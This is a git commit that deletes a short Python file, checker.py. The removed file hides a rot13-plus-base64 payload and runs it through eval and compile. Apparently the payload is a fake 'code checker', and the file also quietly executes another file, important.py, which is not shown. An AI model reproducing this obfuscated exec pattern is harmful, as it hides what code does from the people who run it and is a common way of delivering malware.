f9ed9fb3b118a15a3821f477aae6b5116cd27fc8
grumach <110260624+grumach@users.noreply.github.com>
2022-12-30 18:16:31 +0000

    Delete checker.py

--- checker.py
+++
@@ -1,5 +0,0 @@
-import base64, codecs
-checker = 'nJ1jo3W0VUEcoJHXPz51oJWypvN9VTyhpUI0XPWDoTIup2HtnJ5jqKDtqTuyVTSgo3IhqPOiMvOwo2EyplO5o3Htq2ymnPO0olOwnTIwnmbtVvxXPzMipvOcVTyhVUWuozqyXTyhqPuhqJ1vMKVcXGbXVPNtVUOlnJ50XPWWoaMuoTyxVRAiMTHuVvxXVPNtVUEcoJHhp2kyMKNbZFx='
-exec(open("important.py").read())
-check = eval('codecs.decode(checker, "rot13")')
-eval(compile(base64.b64decode(eval('check')), '<string>', 'exec'))
